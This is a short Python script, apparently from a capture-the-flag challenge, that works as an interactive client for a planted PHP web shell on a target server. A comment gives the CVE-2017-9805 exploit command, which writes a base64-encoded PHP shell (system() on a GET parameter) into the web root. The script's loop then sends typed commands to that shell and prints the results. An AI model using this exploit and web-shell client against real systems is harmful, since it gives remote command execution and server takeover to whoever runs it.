#!/usr/bin/env python

import requests
import re
import sys

# TODO check for 404 and run this again:
## /cve-2017-9805.py -c 'echo PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo= | base64 -d > /var/www/html/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php' -u https://dev.northpolechristmastown.com/orders.xhtml

url = "https://l2s.northpolechristmastown.com/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php"

#Main function
def main(command):
    request = requests.get(url, params={"cmd":command})
    if request.status_code == 404:
        sys.stderr.write("The webshell does not exist, please rexploit")
        exit(1)
    print request.text

if __name__ == "__main__":
    while True:
        cmd = raw_input("albaster_snowball@l2s:$ ")
        main(cmd)
